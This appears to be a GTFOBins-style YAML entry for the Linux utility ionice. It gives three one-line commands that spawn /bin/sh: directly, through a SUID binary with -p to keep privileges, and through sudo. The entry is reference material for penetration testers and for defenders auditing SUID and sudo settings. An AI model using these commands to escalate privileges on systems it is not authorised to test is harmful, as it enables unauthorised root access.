---
functions:
  execute-interactive:
    - code: ionice /bin/sh
  suid-enabled:
    - code: ./ionice /bin/sh -p
  sudo-enabled:
    - code: sudo ionice /bin/sh
---
